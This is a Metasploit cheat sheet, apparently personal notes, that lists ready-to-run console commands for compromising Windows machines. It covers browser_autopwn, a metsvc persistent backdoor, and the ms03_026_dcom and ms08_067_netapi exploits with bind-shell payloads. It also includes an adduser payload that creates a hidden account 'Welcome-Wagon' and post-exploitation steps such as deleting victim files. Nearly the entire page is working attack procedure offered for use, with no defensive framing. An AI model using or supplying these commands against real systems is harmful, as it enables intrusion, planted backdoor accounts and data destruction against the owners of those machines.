Metasploit Exploits cheats
==========================

<pre>
msfconsole #starts metasploit
msfupdate #updates metasploit
run + two tabs #lists all meterpreter scripts
</pre>


<h4>browser autopwn</h4>
<pre>
#victim needs to visit 192.168.1.100
msf> use auxiliary/server/browser_autopwn
msf> set LHOST 192.168.1.100
msf> set SRVPORT 80
msf> set URIPATH /
msf> run
</pre>


<h4>metsvc exploit</h4>
<pre>
#less noisy than persistance exploit
msf> use exploit/multi/handler
msf> set PAYLOAD windows/metsvc_bind_tcp
msf> exploit

post exploit:
run metsvc -r     #removes the service; also remove metsrv.dll, metsvc-server.exe, metsvc.exe 
</pre>



<h4>ms03 exploit</h4>
<pre>
#did not work on service pack 3
msf> use exploit/windows/dcerpc/ms03_026_dcom
msf> set RHOST 192.168.1.101
msf> set PAYLOAD windows/shell_bind_tcp #binds shell on victims tcp port
msf> show options
msf> exploit
</pre>


<h4>netapi exploit</h4>
<pre>
#works almost all of the time on XP
#opens shell session
msf> use exploit/windows/smb/ms08_067_netapi 
msf> set RHOST 192.168.1.101
msf> set PAYLOAD windows/shell_bind_tcp
msf> set LPORT 6000
msf> show options
msf> exploit

post exploit:
netstat -n    #run on victim will show the connection
dir     #lists all files on directory
del     #delete a file on the victim
</pre>


<h4>netapi exploit - adduser</h4>
<pre>
#works on XP almost all of the time
msf> use exploit/windows/smb/ms08_067_netapi 
msf> set RHOST 192.168.1.101
msf> set PAYLOAD windows/adduser
msf> set LPORT 6000
msf> set USER Welcome-Wagon
msf> set PASS h@ck3d
msf> show options
msf> exploit
</pre>
